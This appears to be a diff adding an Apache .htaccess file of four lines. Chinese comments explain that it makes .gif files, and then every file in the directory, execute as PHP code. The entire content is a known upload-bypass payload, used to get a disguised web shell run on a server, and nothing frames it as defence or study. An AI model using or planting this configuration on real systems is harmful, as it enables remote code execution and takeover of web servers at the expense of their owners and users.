@@ -1,0 +1,4 @@
+<IfModule mime_module>
+AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行
+SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行
+</IfModule>
